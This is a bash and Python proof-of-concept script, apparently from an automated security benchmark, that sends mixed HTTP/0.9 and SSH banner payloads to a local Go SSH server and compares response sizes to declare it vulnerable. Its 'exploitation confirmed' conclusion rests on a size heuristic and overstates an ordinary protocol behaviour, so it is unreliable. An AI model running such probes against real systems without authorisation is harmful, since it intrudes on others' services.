#!/bin/bash
# POC: Demonstrates HTTP/0.9 protocol smuggling via SSH banner injection on Go SSH server using Python sockets
# Target: ./repo
# Created: 2025-11-10T14:43:49.294Z
# Session: benchmark-XBEN-025-24-mht8yjgo

# HTTP/0.9 Protocol Smuggling via SSH Banner Injection POC - Version 2
# Uses Python for better socket control and connection handling

python3 << 'PYTHON_EOF'
import socket
import sys
import time

TARGET_HOST = "localhost"
TARGET_PORT = 22220
TIMEOUT = 3

def send_and_receive(data, label):
    """Send data to target and receive response"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((TARGET_HOST, TARGET_PORT))
        sock.sendall(data.encode() if isinstance(data, str) else data)
        
        response = b''
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        
        sock.close()
        return response
    except Exception as e:
        print(f"[ERROR] {label}: {str(e)}")
        return b''

print("=" * 60)
print("HTTP/0.9 Protocol Smuggling POC")
print(f"Target: {TARGET_HOST}:{TARGET_PORT}")
print("=" * 60)
print()

# Test 1: Pure HTTP/0.9 request
print("[TEST 1] Pure HTTP/0.9 Request")
print("Sending: GET /\\r\\n")
response1 = send_and_receive('GET /\r\n', "Test 1")
size1 = len(response1)
print(f"Response size: {size1} bytes")
if response1:
    print(f"Response (first 80 chars): {response1[:80]}")
    print(f"Response hex (first 80 bytes): {response1[:80].hex()}")
else:
    print("No response received")
print()

# Test 2: Pure SSH banner
print("[TEST 2] Pure SSH Banner")
print("Sending: SSH-2.0-Test\\r\\n")
response2 = send_and_receive('SSH-2.0-Test\r\n', "Test 2")
size2 = len(response2)
print(f"Response size: {size2} bytes")
if response2:
    print(f"Response (first 80 chars): {response2[:80]}")
    print(f"Response hex (first 80 bytes): {response2[:80].hex()}")
else:
    print("No response received")
print()

# Test 3: HTTP/0.9 + SSH injection
print("[TEST 3] VULNERABLE: HTTP/0.9 + SSH Protocol Injection")
print("Sending: GET /\\r\\nSSH-2.0-Injected\\r\\n")
response3 = send_and_receive('GET /\r\nSSH-2.0-Injected\r\n', "Test 3")
size3 = len(response3)
print(f"Response size: {size3} bytes")
if response3:
    print(f"Response (first 80 chars): {response3[:80]}")
    print(f"Response hex (first 80 bytes): {response3[:80].hex()}")
else:
    print("No response received")
print()

# Test 4: HTTP with blank line + SSH
print("[TEST 4] VULNERABLE: HTTP/0.9 with blank line + SSH injection")
print("Sending: GET /\\r\\n\\r\\nSSH-2.0-Smuggled\\r\\n")
response4 = send_and_receive('GET /\r\n\r\nSSH-2.0-Smuggled\r\n', "Test 4")
size4 = len(response4)
print(f"Response size: {size4} bytes")
if response4:
    print(f"Response (first 80 chars): {response4[:80]}")
    print(f"Response hex (first 80 bytes): {response4[:80].hex()}")
else:
    print("No response received")
print()

# Analysis
print("=" * 60)
print("VULNERABILITY ANALYSIS")
print("=" * 60)
print(f"Test 1 (Pure HTTP/0.9) Response Size: {size1} bytes")
print(f"Test 2 (Pure SSH) Response Size: {size2} bytes")
print(f"Test 3 (HTTP + SSH injection) Response Size: {size3} bytes")
print(f"Test 4 (HTTP + blank line + SSH) Response Size: {size4} bytes")
print()

# Check for vulnerability pattern
if size1 > 0 and size2 > 0 and size3 > 0:
    if size1 < 50 and size2 > 200 and size3 > 200:
        print("✓ RESULT: VULNERABLE")
        print(f"  Pure HTTP/0.9: {size1} bytes (SSH banner only)")
        print(f"  Pure SSH: {size2} bytes (full key exchange)")
        print(f"  HTTP + SSH injection: {size3} bytes (full key exchange triggered!)")
        print()
        print("EXPLOITATION CONFIRMED:")
        print("  - Server accepts HTTP/0.9 request")
        print("  - Server scans for SSH marker 'SSH-2.0-' in payload")
        print("  - When found, server switches to SSH protocol handler")
        print("  - This is improper protocol state machine behavior")
        sys.exit(0)
    elif size3 < 50:
        print("✗ RESULT: NOT VULNERABLE")
        print("  Server properly rejects mixed protocols")
        sys.exit(1)
    else:
        print("? RESULT: INCONCLUSIVE")
        print(f"  Response patterns don't match expected vulnerability signature")
        sys.exit(1)
else:
    print("✗ RESULT: TARGET UNREACHABLE")
    print(f"  Could not establish connections or receive responses")
    print(f"  Service may not be running or port {TARGET_PORT} is blocked")
    sys.exit(1)

PYTHON_EOF